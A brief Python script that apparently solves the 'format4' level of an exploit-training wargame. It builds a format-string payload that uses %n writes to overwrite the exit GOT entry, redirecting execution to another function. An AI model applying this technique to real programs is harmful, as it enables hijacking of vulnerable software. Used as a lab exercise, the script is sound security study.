#!/usr/bin/python
import struct


# print format4.py | ./format4
# =================================================
# Format4 [Fill in 4 Parts ]
# =================================================
# [Step One] Analyse Paddings
p1 = "aaaa"
p2 = "%x%x%x"
p3 = "%x"

#print p1+p2+p3










padding = 4

# [Step Two] Check Padding

# print p1+"%"+str(padding)+"$x"

# [Step Three] Install Our malicios address into the stack in 4 parts
#
# Findout Dynamic allocation address of exit command using objdump -TR format4
# 0x08049724

p = ''
p+= struct.pack("I", 0x08049724)
p+= struct.pack("I", 0x08049725)
p+= struct.pack("I", 0x08049726)
p+= struct.pack("I", 0x08049727)

# Need To fill 0x080484b4

p+= "%164x" # first padding
p+= "%4$n"
p+= "%208x" # Second padding
p+= "%5$n"
p+= "%128x"  # third padding
p+= "%6$n"
p+= "%260x"  # fourth padding
p+= "%7$n"

print p


